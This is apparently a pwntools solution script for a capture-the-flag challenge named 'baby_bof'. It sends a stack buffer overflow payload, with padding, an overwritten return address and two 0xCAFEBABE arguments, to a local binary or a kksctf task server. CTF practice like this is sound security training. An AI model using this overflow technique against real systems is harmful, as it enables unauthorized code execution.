#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./baby_bof')
else:
    p = remote('tasks.open.kksctf.ru', 10002)

# gdb.attach(p, "b *0x08048616\nc")
pd = '\x00' * 0x104
pd += p32(0x080485F6)
pd += p32(0xCAFEBABE)
pd += p32(0xCAFEBABE)
p.sendlineafter('Enter your name: ', pd)
p.recvuntil('Here it comes: ')
p.interactive()
